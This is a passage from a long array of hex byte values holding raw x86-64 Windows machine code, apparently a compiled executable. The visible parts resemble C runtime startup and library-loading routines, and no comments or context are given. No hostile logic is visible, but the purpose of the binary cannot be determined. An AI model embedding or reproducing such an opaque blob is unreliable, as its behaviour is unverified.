0x1, 0x0, 0x4c, 0x8b, 0x5, 0xf2, 0x8, 0x1, 0x0, 0x48, 0x83, 0xcf, 0xff, 0x41, 0x8b, 0xc0, 0x49, 0x8b, 0xd0, 0x48, 0x33, 0xd1, 0x83, 0xe0, 0x3f, 0x8a, 0xc8, 0x48, 0xd3, 0xca, 0x48, 0x3b, 0xd7, 0xf, 0x84, 0xea, 0x0, 0x0, 0x0, 0x48, 0x85, 0xd2, 0x74, 0x8, 0x48, 0x8b, 0xc2, 0xe9, 0xdf, 0x0, 0x0, 0x0, 0x49, 0x3b, 0xec, 0xf, 0x84, 0xb9, 0x0, 0x0, 0x0, 0x8b, 0x75, 0x0, 0x49, 0x8b, 0x9c, 0xf6, 0x90, 0xa1, 0x1, 0x0, 0x48, 0x85, 0xdb, 0x74, 0xe, 0x48, 0x3b, 0xdf, 0xf, 0x85, 0xfa, 0x0, 0x0, 0x0, 0xe9, 0x87, 0x0, 0x0, 0x0, 0x4d, 0x8b, 0xb4, 0xf6, 0xe0, 0x7, 0x1, 0x0, 0x33, 0xd2, 0x49, 0x8b, 0xce, 0x41, 0xb8, 0x0, 0x8, 0x0, 0x0, 0xff, 0x15, 0x97, 0x68, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0xf, 0x85, 0xb0, 0x0, 0x0, 0x0, 0xff, 0x15, 0x25, 0x68, 0x0, 0x0, 0x83, 0xf8, 0x57, 0x75, 0x45, 0x8d, 0x58, 0xb0, 0x49, 0x8b, 0xce, 0x44, 0x8b, 0xc3, 0x48, 0x8d, 0x15, 0xa8, 0x79, 0x0, 0x0, 0xe8, 0xa3, 0xd5, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x2c, 0x44, 0x8b, 0xc3, 0x48, 0x8d, 0x15, 0xe5, 0x83, 0x0, 0x0, 0x49, 0x8b, 0xce, 0xe8, 0x8d, 0xd5, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x16, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x49, 0x8b, 0xce, 0xff, 0x15, 0x43, 0x68, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x60, 0x48, 0x8b, 0xc7, 0x4c, 0x8d, 0x35, 0xe1, 0x76, 0xff, 0xff, 0x49, 0x87, 0x84, 0xf6, 0x90, 0xa1, 0x1, 0x0, 0x48, 0x83, 0xc5, 0x4, 0x49, 0x3b, 0xec, 0xf, 0x85, 0x4e, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0x5, 0x5, 0x8, 0x1, 0x0, 0x41, 0x8b, 0xc0, 0xb9, 0x40, 0x0, 0x0, 0x0, 0x83, 0xe0, 0x3f, 0x2b, 0xc8, 0x48, 0xd3, 0xcf, 0x49, 0x33, 0xf8, 0x4b, 0x87, 0xbc, 0xfe, 0x30, 0xa2, 0x1, 0x0, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0x48, 0x8b, 0xc3, 0x4c, 0x8d, 0x35, 0x81, 0x76, 0xff, 0xff, 0x49, 0x87, 0x84, 0xf6, 0x90, 0xa1, 0x1, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x9, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xab, 0x67, 0x0, 0x0, 0x49, 0x8b, 0xd5, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xa7, 0x67, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x8e, 0x4c, 0x8b, 0x5, 0x93, 0x7, 0x1, 0x0, 0xba, 0x40, 0x0, 0x0, 0x0, 0x41, 0x8b, 0xc8, 0x83, 0xe1, 0x3f, 0x2b, 0xd1, 0x8a, 0xca, 0x48, 0x8b, 0xd0, 0x48, 0xd3, 0xca, 0x49, 0x33, 0xd0, 0x4b, 0x87, 0x94, 0xfe, 0x30, 0xa2, 0x1, 0x0, 0xeb, 0x89, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x4c, 0x8d, 0xd, 0x60, 0x83, 0x0, 0x0, 0xb9, 0x18, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0x50, 0x83, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x4d, 0x83, 0x0, 0x0, 0xe8, 0x18, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x20, 0x49, 0xba, 0x70, 0xc0, 0xd1, 0x34, 0xda, 0x17, 0xc0, 0xbd, 0x48, 0x8b, 0xd3, 0x48, 0xc7, 0xc1, 0xfa, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0xab, 0x68, 0x0, 0x0, 0xb8, 0x25, 0x2, 0x0, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x4c, 0x8d, 0xd, 0xb9, 0x82, 0x0, 0x0, 0x33, 0xc9, 0x4c, 0x8d, 0x5, 0xac, 0x82, 0x0, 0x0, 0x48, 0x8d, 0x15, 0xad, 0x82, 0x0, 0x0, 0xe8, 0xc8, 0xfd, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x15, 0x49, 0xba, 0x70, 0x30, 0x52, 0x5e, 0x47, 0x27, 0x5, 0xd3, 0x48, 0x83, 0xc4, 0x28, 0x48, 0xff, 0x25, 0x66, 0x68, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0xff, 0x25, 0x9d, 0x67, 0x0, 0x0, 0xcc, 0x48, 0xff, 0x25, 0xad, 0x67, 0x0, 0x0, 0xcc, 0x48, 0xff, 0x25, 0x95, 0x67, 0x0, 0x0, 0xcc, 0x48, 0xff, 0x25, 0x95, 0x67, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x41, 0x8b, 0xf0, 0x4c, 0x8d, 0xd, 0x63, 0x82, 0x0, 0x0, 0x8b, 0xda, 0x4c, 0x8d, 0x5, 0x52, 0x82, 0x0, 0x0, 0x48, 0x8b, 0xf9, 0x48, 0x8d, 0x15, 0x40, 0x78, 0x0, 0x0, 0xb9, 0xe, 0x0, 0x0, 0x0, 0xe8, 0x4e, 0xfd, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x1a, 0x49, 0xba, 0x70, 0xda, 0xd2, 0x32, 0x50, 0x3e, 0xa0, 0x82, 0x44, 0x8b, 0xc6, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0xe9, 0x67, 0x0, 0x0, 0xeb, 0xb, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0x2c, 0x66, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x50, 0x41, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf2, 0x4c, 0x8d, 0xd, 0xf1, 0x81, 0x0, 0x0, 0x48, 0x8b, 0xe9, 0x4c, 0x8d, 0x5, 0xdf, 0x81, 0x0, 0x0, 0x48, 0x8d, 0x15, 0xe0, 0x81, 0x0, 0x0, 0xb9, 0x10, 0x0, 0x0, 0x0, 0xe8, 0xd6, 0xfc, 0xff, 0xff, 0x4c, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x5f, 0x49, 0xba, 0x70, 0xe2, 0x57, 0x50, 0x62, 0x1f, 0xa1, 0xe3, 0x48, 0x8b, 0x94, 0x24, 0xa0, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xcb, 0x48, 0x8b, 0x8c, 0x24, 0x98, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0x84, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x89, 0x54, 0x24, 0x40, 0x8b, 0xd6, 0x48, 0x89, 0x4c, 0x24, 0x38, 0x48, 0x8b, 0x8c, 0x24, 0x90, 0x0, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x8b, 0x8c, 0x24, 0x88, 0x0, 0x0, 0x0, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0xcd, 0x48, 0x89, 0x44, 0x24, 0x20, 0x49, 0x8b, 0xc3, 0xff, 0x15, 0x29, 0x67, 0x0, 0x0, 0xeb, 0x32, 0x33, 0xd2, 0x48, 0x8b, 0xcd, 0xe8, 0x3d, 0x0, 0x0, 0x0, 0x8b, 0xc8, 0x44, 0x8b, 0xcb, 0x8b, 0x84, 0x24, 0x88, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc7, 0x89, 0x44, 0x24, 0x28, 0x8b, 0xd6, 0x48, 0x8b, 0x84, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x15, 0x5d, 0x66, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x6c, 0x24, 0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x50, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xfa, 0x4c, 0x8d, 0xd, 0x2d, 0x81, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x15, 0x23, 0x81, 0x0, 0x0, 0xb9, 0x12, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0xf, 0x81, 0x0, 0x0, 0xe8, 0xfa, 0xfb, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x17, 0x49, 0xba, 0x70, 0x32, 0xd8, 0x54, 0x23, 0x6, 0xdd, 0xea, 0x8b, 0xd7, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x98, 0x66, 0x0, 0x0, 0xeb, 0x8, 0x48, 0x8b, 0xcb, 0xe8, 0x7e, 0x24, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x7c, 0x24, 0x10, 0x48, 0x8b, 0x5, 0xec, 0x4, 0x1, 0x0, 0x48, 0x8d, 0x3d, 0xd5, 0x15, 0x1, 0x0, 0xb9, 0x1e, 0x0, 0x0, 0x0, 0xf3, 0x48, 0xab, 0x48, 0x8b, 0x7c, 0x24, 0x10, 0xb0, 0x1, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x84, 0xc9, 0x75, 0x2f, 0x48, 0x8d, 0x1d, 0x13, 0x15, 0x1, 0x0, 0x48, 0x8b, 0xb, 0x48, 0x85, 0xc9, 0x74, 0x10, 0x48, 0x83, 0xf9, 0xff, 0x74, 0x6, 0xff, 0x15, 0xaf, 0x64, 0x0, 0x0, 0x48, 0x83, 0x23, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x8d, 0x5, 0x88, 0x15, 0x1, 0x0, 0x48, 0x3b, 0xd8, 0x75, 0xd8, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xff, 0x15, 0x7e, 0x65, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x48, 0x89, 0x5, 0x5c, 0x16, 0x1, 0x0, 0xf, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0x25, 0x4c, 0x16, 0x1, 0x0, 0x0, 0xb0, 0x1, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x81, 0xec, 0x90, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x48, 0x88, 0xff, 0x15, 0xc2, 0x63, 0x0, 0x0, 0x45, 0x33, 0xf6, 0x66, 0x44, 0x39, 0x74, 0x24, 0x62, 0xf, 0x84, 0x9a, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x85, 0xc0, 0xf, 0x84, 0x8c, 0x0, 0x0, 0x0, 0x48, 0x63, 0x18, 0x48, 0x8d, 0x70, 0x4, 0xbf, 0x0, 0x20, 0x0, 0x0, 0x48, 0x3, 0xde, 0x39, 0x38, 0xf, 0x4c, 0x38, 0x8b, 0xcf, 0xe8, 0x22, 0x25, 0x0, 0x0, 0x3b, 0x3d, 0xf4, 0x19, 0x1, 0x0, 0xf, 0x4f, 0x3d, 0xed, 0x19, 0x1, 0x0, 0x85, 0xff, 0x74, 0x60, 0x41, 0x8b, 0xee, 0x48, 0x83, 0x3b, 0xff, 0x74, 0x47, 0x48, 0x83, 0x3b, 0xfe, 0x74, 0x41, 0xf6, 0x6, 0x1, 0x74, 0x3c, 0xf6, 0x6, 0x8, 0x75, 0xd, 0x48, 0x8b, 0xb, 0xff, 0x15, 0xdf, 0x64, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x2a, 0x48, 0x8b, 0xc5, 0x4c, 0x8d, 0x5, 0xb9, 0x15, 0x1, 0x0, 0x48, 0x8b, 0xcd, 0x48, 0xc1, 0xf9, 0x6, 0x83, 0xe0, 0x3f, 0x49, 0x8b, 0xc, 0xc8, 0x48, 0x8d, 0x14, 0xc0, 0x48, 0x8b, 0x3, 0x48, 0x89, 0x44, 0xd1, 0x28, 0x8a, 0x6, 0x88, 0x44, 0xd1, 0x38, 0x48, 0xff, 0xc5, 0x48, 0xff, 0xc6, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x83, 0xef, 0x1, 0x75, 0xa3, 0x4c, 0x8d, 0x9c, 0x24, 0x90, 0x0, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x6b, 0x18, 0x49, 0x8b, 0x73, 0x20, 0x49, 0x8b, 0x7b, 0x28, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x33, 0xf6, 0x45, 0x33, 0xf6, 0x48, 0x63, 0xce, 0x48, 0x8d, 0x3d, 0x40, 0x15, 0x1, 0x0, 0x48, 0x8b, 0xc1, 0x83, 0xe1, 0x3f, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0x1c, 0xc9, 0x48, 0x8b, 0x3c, 0xc7, 0x48, 0x8b, 0x44, 0xdf, 0x28, 0x48, 0x83, 0xc0, 0x2, 0x48, 0x83, 0xf8, 0x1, 0x76, 0xa, 0x80, 0x4c, 0xdf, 0x38, 0x80, 0xe9, 0x8b, 0x0, 0x0, 0x0, 0xc6, 0x44, 0xdf, 0x38, 0x81, 0x8b, 0xce, 0x85, 0xf6, 0x74, 0x16, 0x83, 0xe9, 0x1, 0x74, 0xa, 0x83, 0xf9, 0x1, 0xb9, 0xf4, 0xff, 0xff, 0xff, 0xeb, 0xc, 0xb9, 0xf5, 0xff, 0xff, 0xff, 0xeb, 0x5, 0xb9, 0xf6, 0xff, 0xff, 0xff, 0xff, 0x15, 0xf9, 0x63, 0x0, 0x0, 0x48, 0x8b, 0xe8, 0x48, 0x8d, 0x48, 0x1, 0x48, 0x83, 0xf9, 0x1, 0x76, 0x2d, 0x48, 0x8b, 0xc8, 0xff, 0x15, 0xeb, 0x63, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x20, 0xf, 0xb6, 0xc0, 0x48, 0x89, 0x6c, 0xdf, 0x28, 0x83, 0xf8, 0x2, 0x75, 0x7, 0x80, 0x4c, 0xdf, 0x38, 0x40, 0xeb, 0x31, 0x83, 0xf8, 0x3, 0x75, 0x2c, 0x80, 0x4c, 0xdf, 0x38, 0x8, 0xeb, 0x25, 0x80, 0x4c, 0xdf, 0x38, 0x40, 0x48, 0xc7, 0x44, 0xdf, 0x28, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x5, 0xe2, 0x18, 0x1, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xb, 0x49, 0x8b, 0x4, 0x6, 0xc7, 0x40, 0x18, 0xfe, 0xff, 0xff, 0xff, 0xff, 0xc6, 0x49, 0x83, 0xc6, 0x8, 0x83, 0xfe, 0x3, 0xf, 0x85, 0x31, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xe8, 0x38, 0xd7, 0xff, 0xff, 0x33, 0xdb, 0x33, 0xc9, 0xe8, 0x6f, 0x23, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xc, 0xe8, 0xe6, 0xfd, 0xff, 0xff, 0xe8, 0xd1, 0xfe, 0xff, 0xff, 0xb3, 0x1, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xe8, 0x69, 0xd7, 0xff, 0xff, 0x8a, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x48, 0x8d, 0x3d, 0x11, 0x14, 0x1, 0x0, 0x48, 0x8b, 0xc, 0x3b, 0x48, 0x85, 0xc9, 0x74, 0xa, 0xe8, 0xdb, 0x22, 0x0, 0x0, 0x48, 0x83, 0x24, 0x3b, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x81, 0xfb, 0x0, 0x4, 0x0, 0x0, 0x72, 0xd9, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x48, 0x3b, 0xca, 0x74, 0x68, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x14, 0x49, 0xba, 0x70, 0xa2, 0x5c, 0x5c, 0xc4, 0x9e, 0x94, 0xdf, 0xff, 0x15, 0x47, 0x63, 0x0, 0x0, 0x84, 0xc0, 0x74, 0x9, 0x48, 0x83, 0xc3, 0x10, 0x48, 0x3b, 0xde, 0x75, 0xdb, 0x48, 0x3b, 0xde, 0x74, 0x3b, 0x48, 0x3b, 0xdf, 0x74, 0x32, 0x48, 0x83, 0xc3, 0xf8, 0x48, 0x83, 0x7b, 0xf8, 0x0, 0x74, 0x1a, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xba, 0x70, 0x3b, 0x59, 0x3e, 0x75, 0xa6, 0x99, 0x97, 0x33, 0xc9, 0xff, 0x15, 0xb, 0x63, 0x0, 0x0, 0x48, 0x83, 0xeb, 0x10, 0x48, 0x8d, 0x43, 0x8, 0x48, 0x3b, 0xc7, 0x75, 0xd2, 0x32, 0xc0, 0xeb, 0x2, 0xb0, 0x1, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x3b, 0xca, 0x74, 0x24, 0x48, 0x8b, 0x43, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xba, 0x70, 0x3b, 0x59, 0x3e, 0x75, 0xa6, 0x99, 0x97, 0x33, 0xc9, 0xff, 0x15, 0xb8, 0x62, 0x0, 0x0, 0x48, 0x83, 0xeb, 0x10, 0x48, 0x3b, 0xdf, 0x75, 0xdc, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0xd, 0x9, 0x17, 0x1, 0x0, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x2e, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x1e, 0x49, 0xba, 0x70, 0x20, 0xd3, 0x1c, 0xdf, 0xf, 0xed, 0xd1, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x72, 0x62, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x33, 0xc9, 0xe8, 0x9f, 0xd5, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x1d, 0xbf, 0x0, 0x1, 0x0, 0x8b, 0xcb, 0x83, 0xe1, 0x3f, 0x48, 0x33, 0x1d, 0xab, 0x16, 0x1, 0x0, 0x48, 0xd3, 0xcb, 0x33, 0xc9, 0xe8, 0xd5, 0xd5, 0xff, 0xff, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x8b, 0xa, 0xe8, 0x5f, 0xd5, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x1d, 0x7f, 0x0, 0x1, 0x0, 0x8b, 0xcb, 0x83, 0xe1, 0x3f, 0x48, 0x33, 0x1d, 0x83, 0x16, 0x1, 0x0, 0x48, 0xd3, 0xcb, 0x8b, 0xf, 0xe8, 0x95, 0xd5, 0xff, 0xff, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x4c, 0x8b, 0xdc, 0x48, 0x83, 0xec, 0x28, 0xb8, 0x3, 0x0, 0x0, 0x0, 0x4d, 0x8d, 0x4b, 0x10, 0x4d, 0x8d, 0x43, 0x8, 0x89, 0x44, 0x24, 0x38, 0x49, 0x8d, 0x53, 0x18, 0x89, 0x44, 0x24, 0x40, 0x49, 0x8d, 0x4b, 0x8, 0xe8, 0x8f, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0xd, 0x21, 0x16, 0x1, 0x0, 0x48, 0x89, 0xd, 0x22, 0x16, 0x1, 0x0, 0x48, 0x89, 0xd, 0x23, 0x16, 0x1, 0x0, 0x48, 0x89, 0xd, 0x24, 0x16, 0x1, 0x0, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x83, 0xec, 0x40, 0x8b, 0xd9, 0x45, 0x33, 0xed, 0x44, 0x21, 0x6c, 0x24, 0x78, 0x41, 0xb6, 0x1, 0x44, 0x88, 0x74, 0x24, 0x70, 0x83, 0xf9, 0x2, 0x74, 0x21, 0x83, 0xf9, 0x4, 0x74, 0x4c, 0x83, 0xf9, 0x6, 0x74, 0x17, 0x83, 0xf9, 0x8, 0x74, 0x42, 0x83, 0xf9, 0xb, 0x74, 0x3d, 0x83, 0xf9, 0xf, 0x74, 0x8, 0x8d, 0x41, 0xeb, 0x83, 0xf8, 0x1, 0x77, 0x7d, 0x83, 0xe9, 0x2, 0xf, 0x84, 0xaf, 0x0, 0x0, 0x0, 0x83, 0xe9, 0x4, 0xf, 0x84, 0x8b, 0x0, 0x0, 0x0, 0x83, 0xe9, 0x9, 0xf, 0x84, 0x94, 0x0, 0x0, 0x0, 0x83, 0xe9, 0x6, 0xf, 0x84, 0x82, 0x0, 0x0, 0x0, 0x83, 0xf9, 0x1, 0x74, 0x74, 0x33, 0xff, 0xe9, 0x8f, 0x0, 0x0, 0x0, 0xe8, 0x32, 0xd2, 0xff, 0xff, 0x4c, 0x8b, 0xe8, 0x48, 0x85, 0xc0, 0x75, 0x18, 0x83, 0xc8, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0x88, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0x48, 0x8b, 0x0, 0x48, 0x8b, 0xd, 0x50, 0x72, 0x0, 0x0, 0x48, 0xc1, 0xe1, 0x4, 0x48, 0x3, 0xc8, 0xeb, 0x9, 0x39, 0x58, 0x4, 0x74, 0xb, 0x48, 0x83, 0xc0, 0x10, 0x48, 0x3b, 0xc1, 0x75, 0xf2, 0x33, 0xc0, 0x48, 0x85, 0xc0, 0x75, 0x12, 0xe8, 0x85, 0xd9, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x3e, 0xd8, 0xff, 0xff, 0xeb, 0xae, 0x48, 0x8d, 0x78, 0x8, 0x45, 0x32, 0xf6, 0x44, 0x88, 0x74, 0x24, 0x70, 0xeb, 0x22, 0x48, 0x8d, 0x3d, 0x2b, 0x15, 0x1, 0x0, 0xeb, 0x19, 0x48, 0x8d, 0x3d, 0x1a, 0x15, 0x1, 0x0, 0xeb, 0x10, 0x48, 0x8d, 0x3d, 0x21, 0x15, 0x1, 0x0, 0xeb, 0x7, 0x48, 0x8d, 0x3d, 0x0, 0x15, 0x1, 0x0, 0x48, 0x83, 0xa4, 0x24, 0x80, 0x0, 0x0, 0x0, 0x0, 0x45, 0x84, 0xf6, 0x74, 0xb, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0xc0, 0xd3, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x37, 0x45, 0x84, 0xf6, 0x74, 0x12, 0x48, 0x8b, 0x5, 0xd8, 0xfe, 0x0, 0x0, 0x8b, 0xc8, 0x83, 0xe1, 0x3f, 0x48, 0x33, 0xf0, 0x48, 0xd3, 0xce, 0x48, 0x83, 0xfe, 0x1, 0xf, 0x84, 0x94, 0x0, 0x0, 0x0, 0x48, 0x85, 0xf6, 0xf, 0x84, 0x17, 0x1, 0x0, 0x0, 0x41, 0xbc, 0x10, 0x9, 0x0, 0x0, 0x83, 0xfb, 0xb, 0x77, 0x3d, 0x41, 0xf, 0xa3, 0xdc, 0x73, 0x37, 0x49, 0x8b, 0x45, 0x8, 0x48, 0x89, 0x84, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x83, 0x65, 0x8, 0x0, 0x83, 0xfb, 0x8, 0x75, 0x53, 0xe8, 0xb9, 0xcf, 0xff, 0xff, 0x8b, 0x40, 0x10, 0x89, 0x44, 0x24, 0x78, 0x89, 0x44, 0x24, 0x20, 0xe8, 0xa9, 0xcf, 0xff, 0xff, 0xc7, 0x40, 0x10, 0x8c, 0x0, 0x0, 0x0, 0x83, 0xfb, 0x8, 0x75, 0x32, 0x48, 0x8b, 0x5, 0x5e, 0x71, 0x0, 0x0, 0x48, 0xc1, 0xe0, 0x4, 0x49, 0x3, 0x45, 0x0, 0x48, 0x8b, 0xd, 0x57, 0x71, 0x0, 0x0, 0x48, 0xc1, 0xe1, 0x4, 0x48, 0x3, 0xc8, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x3b, 0xc1, 0x74, 0x1d, 0x48, 0x83, 0x60, 0x8, 0x0, 0x48, 0x83, 0xc0, 0x10, 0xeb, 0xeb, 0x48, 0x8b, 0x5, 0x34, 0xfe, 0x0, 0x0, 0x48, 0x89, 0x7, 0xeb, 0x6, 0x41, 0xbc, 0x10, 0x9, 0x0, 0x0, 0x45, 0x84, 0xf6, 0x74, 0xa, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0x46, 0xd3, 0xff, 0xff, 0x48, 0x83, 0xfe, 0x1, 0x75, 0x7, 0x33, 0xc0, 0xe9, 0x8e, 0xfe, 0xff, 0xff, 0x83, 0xfb, 0x8, 0x75, 0x23, 0xe8, 0x33, 0xcf, 0xff, 0xff, 0x49, 0xba, 0x70, 0x33, 0xd3, 0x30, 0x4f, 0x1f, 0x9c, 